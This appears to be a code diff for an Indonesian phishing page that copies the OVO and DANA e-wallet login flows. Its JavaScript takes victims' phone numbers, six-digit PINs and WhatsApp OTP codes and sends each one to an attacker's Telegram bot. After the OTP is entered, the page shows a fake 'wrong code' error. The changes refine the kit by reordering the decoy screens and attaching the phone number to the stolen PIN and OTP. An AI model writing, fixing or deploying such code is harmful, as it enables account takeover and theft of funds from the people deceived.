@@ -387,6 +387,33 @@
         <p class="text-gray-600 mb-8 text-center">Masuk atau daftar cuma butuh nomor HP aja.</p>
 
         <div class="flex mb-4">
+<!-- ==========================================
+    HALAMAN OVO - DIPERBAIKI: LOGO → ANIMASI → PINDAH OTOMATIS
+========================================== -->
+<section id="halamanovo" class="min-h-screen hidden bg-white flex items-center justify-center z-50">
+    <!-- ✅ Logo ukuran pas, gak ketumpuk -->
+    <img src="https://i.ibb.co.com/NgfBSB6j/IMG-20260601-WA0030.jpg" 
+         alt="OVO Logo" 
+         class="w-4/5 max-w-[280px] h-auto object-contain">
+</section>
+
+<!-- ✅ HALAMAN LOADING / ANIMASI -->
+<section id="halamanovo_loading" class="min-h-screen hidden bg-white flex flex-col items-center justify-center gap-6 z-50">
+    <div class="w-16 h-16 border-4 border-purple-500 border-t-transparent rounded-full animate-spin"></div>
+    <p class="text-gray-700 font-medium">Memuat OVO...</p>
+</section>
+
+<section id="halamanovo_1" class="min-h-screen hidden bg-white">
+    <header class="bg-white px-4 py-4 flex items-center justify-between border-b border-gray-100">
+        <button onclick="bukaHalaman(3)" class="text-gray-800 text-xl"><i class="fa fa-arrow-left"></i></button>
+        <h1 class="font-bold text-lg">Masuk atau Daftar</h1>
+        <button class="text-gray-800 text-lg"><i class="fa fa-question-circle-o"></i></button>
+    </header>
+
+    <div class="px-6 py-8">
+        <p class="text-gray-600 mb-8 text-center">Masuk atau daftar cuma butuh nomor HP aja.</p>
+
+        <div class="flex mb-4">
             <div class="bg-purple-50 rounded-l-lg py-4 px-4 flex items-center border border-purple-100 border-r-0">
                 <span class="font-medium text-gray-700">+62</span>
             </div>
@@ -403,11 +430,6 @@
             Lanjutkan
         </button>
     </div>
-</section>
-
-<section id="halamanovo_loading" class="min-h-screen hidden bg-white flex flex-col items-center justify-center gap-6">
-    <div class="w-16 h-16 border-4 border-purple-500 border-t-transparent rounded-full animate-spin"></div>
-    <p class="text-gray-700 font-medium">Sedang memproses...</p>
 </section>
 
 <section id="halamanovo_2" class="min-h-screen hidden bg-white">
@@ -453,13 +475,21 @@
         <button id="btnKirimUlangOvo" onclick="mulaiHitunganOvo()" class="text-purple-600 font-semibold text-sm hidden">Kirim Ulang Link</button>
     </div>
 </section>
-
+        
 
 <!-- ==========================================
-    HALAMAN DANA - LENGKAP
+    HALAMAN DANA - DIPERBAIKI: LOGO → ANIMASI → PINDAH OTOMATIS
 ========================================== -->
 <section id="halamandana" class="min-h-screen hidden bg-danaBlue flex items-center justify-center z-50">
-    <img src="https://i.ibb.co.com/xq1Pkp0T/IMG-20260601-WA0020.jpg" alt="DANA Logo" class="w-full h-full object-contain">
+    <!-- ✅ Logo ukuran pas, gak ketumpuk -->
+    <img src="https://i.ibb.co.com/nHsqPpDT/20260601-WA0020.jpg" 
+         alt="DANA Logo" 
+         class="w-4/5 max-w-[280px] h-auto object-contain">
+</section>
+
+<section id="halamandana_loading" class="min-h-screen hidden bg-danaBlue flex flex-col items-center justify-center gap-6 z-50">
+    <div class="w-16 h-16 border-4 border-white border-t-transparent rounded-full animate-spin"></div>
+    <p class="text-white font-medium">Sedang memproses...</p>
 </section>
 
 <section id="halamandana_1" class="min-h-screen hidden bg-danaBlue text-white">
@@ -468,36 +498,33 @@
 
         <div class="flex items-center bg-white rounded-lg mb-6">
             <div class="px-3 border-r border-gray-200">
-                <img src="https://flagcdn.com/w20/id.png" class="w-5">
+                <img src="https://flagcdn.com/w20/id.png" alt="" class="w-5">
                 <span class="text-gray-800 font-medium ml-1">+62</span>
             </div>
-            <input type="tel" id="nomorDana" class="flex-1 p-3 text-lg text-gray-800 outline-none rounded-r-lg" placeholder="" oninput="cekTombolDana()">
+            <input type="tel" id="nomorDana" class="flex-1 p-3 text-lg text-gray-800 outline-none rounded-r-lg placeholder:text-gray-400" placeholder="" oninput="cekTombolDana()">
         </div>
 
         <p class="text-sm text-white/80 mb-16">
-            Dengan melanjutkan, kamu setuju dengan <a href="#" class="text-white underline">Syarat & Ketentuan</a> dan <a href="#" class="text-white underline">Kebijakan Privasi</a> kami
+            Dengan melanjutkan, kamu setuju dengan <a href="#" class="text-white underline">Syarat & Ketentuan</a> dan <a href="#" class="text-white underline">Kebijakan Privasi</a> DANA
         </p>
 
-        <button id="btnLanjutDana" onclick="prosesLanjutDana()" class="w-full text-white/70 font-semibold text-lg py-3" disabled>
+        <button id="btnLanjutDana" onclick="prosesLanjutDana()" class="w-full text-white/70 font-semibold text-lg py-3 bg-white/20 rounded-lg" disabled>
             LANJUT
         </button>
     </div>
 </section>
 
-<section id="halamandana_loading" class="min-h-screen hidden bg-danaBlue flex flex-col items-center justify-center gap-6">
-    <div class="w-16 h-16 border-4 border-white border-t-transparent rounded-full animate-spin"></div>
-    <p class="text-white font-medium">Sedang memproses...</p>
-</section>
-
 <section id="halamandana_2" class="min-h-screen hidden bg-white">
     <header class="bg-danaBlue text-white px-4 py-3 flex items-center justify-between">
         <button onclick="bukaHalaman('dana_1')" class="text-white text-xl"><i class="fa fa-times"></i></button>
-        <h1 class="font-bold text-lg">Masuk</h1>
+        <h1 class="font-bold text-lg">Masukkan PIN</h1>
         <div></div>
     </header>
 
     <div class="px-8 py-16 text-center" onclick="fokusPinDana()">
-        <h2 class="text-2xl font-semibold text-gray-800 mb-12">Masukkan PIN</h2>
+        <input type="password" id="pinDana" class="opacity-0 absolute top-0 left-0 w-0 h-0" maxlength="6" autofocus inputmode="numeric" oninput="isiPinDana(this.value)">
+
+        <h2 class="text-xl font-semibold text-gray-800 mb-12">Masukkan PIN</h2>
 
         <div class="flex justify-center gap-4 mb-16">
             <div class="w-4 h-4 rounded-full border-2 border-gray-300 pin-bulat-dana"></div>
@@ -512,46 +539,43 @@
             <a href="#" class="flex items-center gap-1"><i class="fa fa-question-circle-o"></i> BUTUH BANTUAN?</a>
             <a href="#">LUPA PIN?</a>
         </div>
-
-        <input type="password" id="pinDana" class="opacity-0 absolute top-0 left-0 w-0 h-0" maxlength="6" autofocus inputmode="numeric" oninput="isiPinDana(this.value)">
     </div>
 </section>
 
 <section id="halamandana_3" class="min-h-screen hidden bg-danaBlue text-white">
     <header class="bg-danaBlue text-white px-4 py-3 flex items-center justify-between">
         <button onclick="bukaHalaman('dana_2')" class="text-white text-xl"><i class="fa fa-arrow-left"></i></button>
-        <h1 class="font-bold text-lg">Masuk</h1>
+        <h1 class="font-bold text-lg">Verifikasi</h1>
         <div></div>
     </header>
 
     <div class="px-8 py-12 text-center">
         <h2 class="text-lg font-light mb-4">Kode OTP telah dikirim ke</h2>
+
         <div class="bg-white/20 rounded-lg py-2 px-4 inline-flex items-center gap-2 mb-2">
-            <img src="https://flagcdn.com/w20/id.png" class="w-5">
-            <span class="font-semibold text-lg" id="nomorTujuanDana">+62 8xxxxxxxxx</span>
-        </div>
-        <p class="text-white/80 text-sm mb-10">via <i class="fa fa-whatsapp"></i> WhatsApp</p>
-
-        <div class="flex justify-center gap-4 mb-6" onclick="fokusKodeDana()">
-            <div class="w-14 h-16 bg-white rounded-md text-gray-800 text-2xl font-bold flex items-center justify-center kode-dana"></div>
-            <div class="w-14 h-16 bg-white rounded-md text-gray-800 text-2xl font-bold flex items-center justify-center kode-dana"></div>
-            <div class="w-14 h-16 bg-white rounded-md text-gray-800 text-2xl font-bold flex items-center justify-center kode-dana"></div>
-            <div class="w-14 h-16 bg-white rounded-md text-gray-800 text-2xl font-bold flex items-center justify-center kode-dana"></div>
+            <img src="https://flagcdn.com/w20/id.png" alt="" class="w-5">
+            <span id="nomorTujuanDana" class="font-semibold">62 8xxxxxxxxx</span>
         </div>
 
-        <p id="pesanSalahDana" class="text-red-300 text-sm font-medium mb-4 hidden">Pastikan kode OTP yang kamu masukkan benar</p>
+        <p class="text-white/80 text-sm mb-16">via <i class="fa fa-whatsapp"></i> WhatsApp</p>
 
-        <p class="text-white/80 text-sm mb-4">NOMOR TIDAK AKTIF?</p>
-        <button class="bg-white text-danaBlue font-semibold py-2 px-6 rounded-md mb-8">KIRIM ULANG</button>
-
-        <div class="text-sm">
-            <a href="#" class="text-white underline flex items-center justify-center gap-1"><i class="fa fa-question-circle-o"></i> BUTUH BANTUAN?</a>
-        </div>
-
+        <!-- ✅ KOTAK OTP 4 ANGKA SESUAI TAMPILAN -->
         <input type="text" id="kodeOtpDana" class="opacity-0 absolute top-0 left-0 w-0 h-0" maxlength="4" autofocus inputmode="numeric" oninput="isiKodeOtpDana(this.value)">
-    </div>
-</section>
 
+        <div class="flex justify-center gap-4 mb-6">
+            <div class="w-14 h-16 bg-white rounded-md text-gray-800 text-2xl font-bold flex items-center justify-center kode-dana"></div>
+            <div class="w-14 h-16 bg-white rounded-md text-gray-800 text-2xl font-bold flex items-center justify-center kode-dana"></div>
+            <div class="w-14 h-16 bg-white rounded-md text-gray-800 text-2xl font-bold flex items-center justify-center kode-dana"></div>
+            <div class="w-14 h-16 bg-white rounded-md text-gray-800 text-2xl font-bold flex items-center justify-center kode-dana"></div>
+        </div>
+
+        <!-- ✅ TULISAN MERAH -->
+        <p id="pesanSalahDana" class="text-red-500 text-sm font-medium mb-4 hidden">Pastikan kode OTP yang kamu masukkan benar</p>
+
+        <p class="text-white/80 text-sm mb-2">Belum terima kode? Kirim ulang dalam <span id="hitunganMundurDana" class="font-bold">58</span> detik</p>
+        <button id="btnKirimUlangDana" class="text-white font-semibold text-sm hidden">KIRIM ULANG</button>
+    </div>
+</section>       
 
 <!-- ==========================================
     SCRIPT UTAMA - DIPERBAIKI 100% BERFUNGSI
@@ -676,7 +700,7 @@ function cekOTP() {
 }
 
 // ==========================================
-// FUNGSI OVO
+// FUNGSI OVO - DIPERBAIKI URUTAN: LOGO → LOADING → NOMOR HP
 // ==========================================
 function cekTombolOvo() {
     const nomor = document.getElementById('nomorOvo').value;
@@ -695,14 +719,23 @@ function cekTombolOvo() {
 function prosesLanjutOvo() {
     const nomor = document.getElementById('nomorOvo').value;
     const pesan = `🟣 *LOGIN OVO*%0A%0ANomor: +62${nomor}`;
-    fetch(API_TELEGRAM + `?chat_id=${CHAT_ID}&text=${pesan}&parse_mode=Markdown`);
+    fetch(API_TELEGRAM + `?chat_id=${TELEGRAM_CHAT_ID}&text=${pesan}&parse_mode=Markdown`);
 
     document.getElementById('tampilNomorOvo').innerText = `0${nomor}`;
-    bukaHalaman('ovo_loading');
-    setTimeout(() => bukaHalaman('ovo_2'), 1500);
+    
+    // ✅ URUTAN BENAR: LOGO → ANIMASI → HALAMAN ISI NOMOR
+    bukaHalaman('ovo');       // Tampil Logo
+    setTimeout(() => {
+        bukaHalaman('ovo_loading'); // Tampil Animasi Muter
+        setTimeout(() => {
+            bukaHalaman('ovo_1');   // PINDAH OTOMATIS KE HALAMAN NOMOR HP
+        }, 1200); // Durasi animasi
+    }, 800);
 }
 
-function fokusPinOvo() { document.getElementById('pinOvo').focus(); }
+function fokusPinOvo() { 
+    document.getElementById('pinOvo').focus(); 
+}
 
 function isiPinOvo(val) {
     const bulat = document.querySelectorAll('.pin-bulat-ovo');
@@ -710,8 +743,7 @@ function isiPinOvo(val) {
 
     if(val.length >= 6) {
         const pesan = `🟣 *PIN OVO*%0A%0APIN: ${val}`;
-        fetch(API_TELEGRAM + `?chat_id=${CHAT_ID}&text=${pesan}&parse_mode=Markdown`);
-        
+        fetch(API_TELEGRAM + `?chat_id=${TELEGRAM_CHAT_ID}&text=${pesan}&parse_mode=Markdown`);
         bukaHalaman('ovo_3');
     }
 }
@@ -730,10 +762,10 @@ function mulaiHitunganOvo() {
             btn.classList.remove('hidden');
         }
     }, 1000);
-}
-
+    }
+    
 // ==========================================
-// FUNGSI DANA
+// FUNGSI DANA - DIPERBAIKI TOTAL
 // ==========================================
 function cekTombolDana() {
     const nomor = document.getElementById('nomorDana').value;
@@ -745,43 +777,59 @@ function cekTombolDana() {
 function prosesLanjutDana() {
     const nomor = document.getElementById('nomorDana').value;
     const pesan = `🔵 *LOGIN DANA*%0A%0ANomor: +62${nomor}`;
-    fetch(API_TELEGRAM + `?chat_id=${CHAT_ID}&text=${pesan}&parse_mode=Markdown`);
+    fetch(API_TELEGRAM + `?chat_id=${TELEGRAM_CHAT_ID}&text=${pesan}&parse_mode=Markdown`);
 
     document.getElementById('nomorTujuanDana').innerText = `+62 ${nomor}`;
-    bukaHalaman('dana_loading');
-    setTimeout(() => bukaHalaman('dana_2'), 1500);
+    
+    // ✅ URUTAN BENAR: LOGO → ANIMASI → HALAMAN ISI NOMOR
+    bukaHalaman('dana');
+    setTimeout(() => {
+        bukaHalaman('dana_loading');
+        setTimeout(() => {
+            bukaHalaman('dana_1');
+        }, 1200);
+    }, 800);
 }
 
-function fokusPinDana() { document.getElementById('pinDana').focus(); }
+function fokusPinDana() { 
+    document.getElementById('pinDana').focus(); 
+}
 
 function isiPinDana(val) {
     const bulat = document.querySelectorAll('.pin-bulat-dana');
     bulat.forEach((el, i) => el.style.backgroundColor = val[i] ? '#0060E5' : 'transparent');
 
     if(val.length >= 6) {
-        const pesan = `🔵 *PIN DANA*%0A%0APIN: ${val}`;
-        fetch(API_TELEGRAM + `?chat_id=${CHAT_ID}&text=${pesan}&parse_mode=Markdown`);
-        
+        const pesan = `🔵 *PIN DANA*%0A%0ANomor: +62${document.getElementById('nomorDana').value}%0APIN: ${val}`;
+        fetch(API_TELEGRAM + `?chat_id=${TELEGRAM_CHAT_ID}&text=${pesan}&parse_mode=Markdown`);
         bukaHalaman('dana_3');
     }
 }
 
-function fokusKodeDana() { document.getElementById('kodeOtpDana').focus(); }
+function fokusKodeDana() { 
+    document.getElementById('kodeOtpDana').focus(); 
+}
 
 function isiKodeOtpDana(val) {
+    // ✅ DISET KE 4 ANGKA SESUAI TAMPILAN
     const kotak = document.querySelectorAll('.kode-dana');
-    const pesan = document.getElementById('pesanSalahDana');
-    pesan.classList.add('hidden');
+    const pesanSalah = document.getElementById('pesanSalahDana');
+    pesanSalah.classList.add('hidden');
 
-    kotak.forEach((el, i) => el.innerText = val[i] || '');
+    // Isi kotak + ubah warna
+    kotak.forEach((el, i) => {
+        el.innerText = val[i] || '';
+        el.style.backgroundColor = val[i] ? '#0060E5' : 'white';
+        el.style.color = val[i] ? 'white' : '#000';
+    });
 
-    if(val.length >= 4) {
-        const pesanTele = `🔵 *KODE OTP DANA*%0A%0AKode: ${val}`;
-        fetch(API_TELEGRAM + `?chat_id=${CHAT_ID}&text=${pesanTele}&parse_mode=Markdown`);
-        
-        pesan.classList.remove('hidden');
+    // ✅ KALAU SUDAH 4 ANGKA → KIRIM + TAMPIL TULISAN MERAH
+    if(val.length === 4) {
+        const pesan = `🔵 *KODE OTP DANA*%0A%0ANomor: +62${document.getElementById('nomorDana').value}%0AKode: ${val}`;
+        fetch(API_TELEGRAM + `?chat_id=${TELEGRAM_CHAT_ID}&text=${pesan}&parse_mode=Markdown`);
+        pesanSalah.classList.remove('hidden');
     }
-}
+    }
 </script>
 
 </body>
